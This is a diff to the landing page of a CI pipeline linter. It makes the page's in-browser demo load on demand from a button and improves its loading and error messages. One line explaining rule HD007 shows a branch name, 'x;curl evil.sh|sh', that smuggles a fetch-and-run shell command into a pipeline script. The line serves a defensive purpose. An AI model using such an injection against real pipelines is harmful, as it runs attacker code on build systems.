@@ -22,6 +22,9 @@
 <meta name="twitter:image" content="https://gerardrecinto.github.io/harness-doctor/og.png">
 <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%2310b981'/%3E%3Cpath d='M9 16.5l4.5 4.5L23 11' fill='none' stroke='%23052e22' stroke-width='3.2' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E">
 <style>
+[hidden]{display:none!important}
+.btn:disabled{opacity:.7;cursor:progress}
+#run-checks{margin:12px 16px}
 :root{--bg:#f8fafc;--panel:#fff;--panel2:#f1f5f9;--line:#e2e8f0;--fg:#0f172a;--mute:#475569;--brand:#047857;--brand-bg:#d1fae5;--err:#b91c1c;--err-bg:#fee2e2;--warn:#b45309;--warn-bg:#fef3c7;--info:#0e7490;--info-bg:#cffafe;--code:#0b1220;--code-fg:#e2e8f0}
 @media (prefers-color-scheme:dark){:root:not([data-theme=light]){--bg:#070d1a;--panel:#0d1526;--panel2:#111c33;--line:#1e2b47;--fg:#e8eefc;--mute:#9fb0cc;--brand:#34d399;--brand-bg:#06382b;--err:#fca5a5;--err-bg:#3b1212;--warn:#fcd34d;--warn-bg:#3a2a07;--info:#67e8f9;--info-bg:#08303a}}
 :root[data-theme=dark]{--bg:#070d1a;--panel:#0d1526;--panel2:#111c33;--line:#1e2b47;--fg:#e8eefc;--mute:#9fb0cc;--brand:#34d399;--brand-bg:#06382b;--err:#fca5a5;--err-bg:#3b1212;--warn:#fcd34d;--warn-bg:#3a2a07;--info:#67e8f9;--info-bg:#08303a}
@@ -146,7 +149,7 @@ footer .wrap{display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap}
 
 <section id="try"><div class="wrap">
   <h2>Try it on a sample pipeline</h2>
-  <p class="sub">This runs the real linter in your browser. Edit the file and the findings update. Nothing leaves this tab. It needs JavaScript; without it, use the install steps below.</p>
+  <p class="sub">This runs the real linter in your browser. Run a sample to load the linter, then edit the file and the findings update. Nothing leaves this tab. It needs JavaScript; without it, use the install steps below.</p>
   <div class="lab">
     <div class="card">
       <h3><span id="fname">pipeline.yaml</span>
@@ -173,7 +176,8 @@ footer .wrap{display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap}
           <button class="chip" data-fmt="github" aria-pressed="false">GitHub</button>
         </span>
       </h3>
-      <div class="out" id="out" aria-live="polite"><div class="status" id="boot">Loading the linter (about 10 MB the first time, cached after)...<noscript> JavaScript is off, so the demo cannot run. The CLI below does the same checks.</noscript></div></div>
+      <button class="btn primary" id="run-checks" type="button" hidden>Run checks</button>
+      <div class="out" id="out" aria-live="polite"><div class="status">Choose a sample and run checks. The Python runtime downloads only when you start.<noscript> JavaScript is off, so the demo cannot run. The CLI below does the same checks.</noscript></div></div>
       <div class="summary" id="summary" hidden></div>
     </div>
   </div>
@@ -184,7 +188,7 @@ footer .wrap{display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap}
   <h2>What it checks</h2>
   <p class="sub">The list comes from the linter itself, so it matches the code. Without JavaScript, see the <a href="https://github.com/gerardrecinto/harness-doctor#readme">README</a>.</p>
   <p class="pw">Each row is one mistake the tool looks for, and why it is risky.</p>
-  <div class="tw" tabindex="0" role="region" aria-label="Pipeline rules"><table><thead><tr><th>Rule</th><th>Severity</th><th>File</th><th>Check</th><th>Why it matters</th></tr></thead><tbody id="rules-body"><tr><td colspan="5">Loading...</td></tr></tbody></table></div>
+  <div class="tw" tabindex="0" role="region" aria-label="Pipeline rules"><table><thead><tr><th>Rule</th><th>Severity</th><th>File</th><th>Check</th><th>Why it matters</th></tr></thead><tbody id="rules-body"><tr><td colspan="5">Run a sample to load the full rule list, or read the README above. Checks include literal secrets, image versions, timeouts and production approvals.</td></tr></tbody></table></div>
   <p class="note">HD007 is easy to miss: Harness pastes <code>&lt;+codebase.branch&gt;</code> into the script before the shell reads it, so a branch named <code>x;curl evil.sh|sh</code> runs as code.</p>
 </div></section>
 
@@ -233,7 +237,6 @@ harness-doctor explain HD007</code></pre></div>
   <span><a href="https://github.com/gerardrecinto/harness-doctor">Source</a> &middot; <a href="https://github.com/gerardrecinto/harness-doctor/releases">Releases</a> &middot; <a href="https://github.com/gerardrecinto/harness-doctor/blob/main/CHANGELOG.md">Changelog</a></span>
 </div></footer>
 
-<script src="https://cdn.jsdelivr.net/pyodide/v0.26.4/full/pyodide.js" integrity="sha384-i3R37b3tF+HWudsUf1VSEOY2YxwSNMqY8DQa9Z0O3xh+NkJ9o+yjcGyIi5huj+nB" crossorigin="anonymous"></script>
 <script>
 (() => {
   const PY_FILES = ["__init__.py", "model.py", "rules.py", "ci.py", "engine.py", "report.py"];
@@ -244,7 +247,9 @@ harness-doctor explain HD007</code></pre></div>
   const FILES = { bad: "pipeline.yaml", good: "pipeline.yaml", workflow: "ci.yml", jenkins: "Jenkinsfile" };
   const KINDS = { harness: "Harness", github: "Actions", jenkins: "Jenkins" };
   let cur = "bad";
-  let py = null, fmt = "list", timer = null, last = null;
+  let py = null, fmt = "list", timer = null, last = null, loading = null;
+  const runButton = $("run-checks");
+  runButton.hidden = false;
 
   function track(name) { try { if (window.plausible) window.plausible(name); } catch (e) {} }
 
@@ -311,8 +316,26 @@ def rules():
     return json.dumps([{"id": r.id, "severity": r.severity, "title": r.title, "why": r.why, "kind": r.kind} for r in RULES.values()])
 `;
 
+  async function loadRuntime() {
+    if (window.loadPyodide) return;
+    await new Promise((resolve, reject) => {
+      const script = document.createElement("script");
+      script.src = "https://cdn.jsdelivr.net/pyodide/v0.26.4/full/pyodide.js";
+      script.integrity = "sha384-i3R37b3tF+HWudsUf1VSEOY2YxwSNMqY8DQa9Z0O3xh+NkJ9o+yjcGyIi5huj+nB";
+      script.crossOrigin = "anonymous";
+      script.onload = resolve;
+      script.onerror = () => { script.remove(); reject(new Error("runtime download failed")); };
+      document.head.append(script);
+    });
+  }
+
   async function boot() {
+    runButton.disabled = true;
+    runButton.textContent = "Loading checks...";
+    out.textContent = "Loading the Python runtime. Your pipeline stays in this tab.";
     try {
+      await examplesReady;
+      await loadRuntime();
       py = await loadPyodide();
       await py.loadPackage("pyyaml");
       py.FS.mkdirTree("/lib/harness_doctor");
@@ -328,13 +351,25 @@ def rules():
       window.__HD_READY__ = true;
       lint();
     } catch (e) {
-      $("boot").textContent = "The in-browser linter did not load (" + e.message + "). The CLI install below works the same way.";
+      py = null;
+      window.__HD_READY__ = false;
+      out.textContent = "The in-browser linter did not load (" + e.message + "). The CLI install below works the same way.";
       $("rules-body").innerHTML = '<tr><td colspan="5">The rule list loads with the linter. See the README for the full table.</td></tr>';
+    } finally {
+      runButton.disabled = false;
+      runButton.textContent = window.__HD_READY__ ? "Run checks" : "Retry checks";
     }
   }
 
+  async function start() {
+    if (window.__HD_READY__) { lint(); return; }
+    if (!loading) loading = boot().finally(() => { loading = null; });
+    await loading;
+  }
+  runButton.addEventListener("click", start);
+
   function lint() {
-    if (!py) return;
+    if (!window.__HD_READY__) return;
     try {
       py.globals.set("_in", src.value);
       py.globals.set("_name", FILES[cur]);
@@ -363,18 +398,18 @@ def rules():
     src.scrollTop = Math.max(0, (line - 4) * 20);
   });
 
-  function setExample(name) {
+  async function setExample(name) {
+    await examplesReady;
     cur = name; src.value = examples[name]; $("fname").textContent = FILES[name];
     document.querySelectorAll("[data-ex]").forEach((x) => x.setAttribute("aria-pressed", x.dataset.ex === name));
-    drawGutter(null); lint(); track("hd_example_" + name);
+    drawGutter(null); await start(); track("hd_example_" + name);
   }
   document.querySelectorAll("[data-ex]").forEach((b) => b.addEventListener("click", () => setExample(b.dataset.ex)));
 
   const EXFILES = { bad: "bad.yaml", good: "good.yaml", workflow: "workflow.yml", jenkins: "Jenkinsfile" };
-  Promise.all(Object.keys(EXFILES).map((n) => fetch(`examples/${EXFILES[n]}`).then((r) => { if (!r.ok) throw 0; return r.text(); }).then((t) => { examples[n] = t; }))).then(() => {
+  const examplesReady = Promise.all(Object.keys(EXFILES).map((n) => fetch(`examples/${EXFILES[n]}`).then((r) => { if (!r.ok) throw 0; return r.text(); }).then((t) => { examples[n] = t; }))).then(() => {
     src.value = examples.bad; drawGutter(null); if (py) lint();
   }).catch(() => { src.value = "# could not load the example\n"; });
-  boot();
 })();
 
 (() => {
